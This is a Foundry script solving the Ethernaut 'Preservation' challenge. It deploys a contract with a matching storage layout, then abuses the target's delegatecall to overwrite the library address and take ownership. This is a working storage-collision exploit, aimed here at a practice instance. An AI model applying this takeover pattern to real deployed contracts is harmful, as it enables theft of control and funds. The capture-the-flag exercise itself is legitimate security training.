// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
    function setSecondTime(uint _timeStamp) external;
}

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    function setTime(uint256 _timeStamp) public {
        require(_timeStamp==0, "Invalid Timestamp");
        owner = msg.sender;
    }
}

contract PreservationSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        Attack attack = new Attack();
        IPreservation(challengeInstance).setFirstTime(uint256(uint160(address(attack))));
        IPreservation(challengeInstance).setFirstTime(0);

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(16));
    }
}
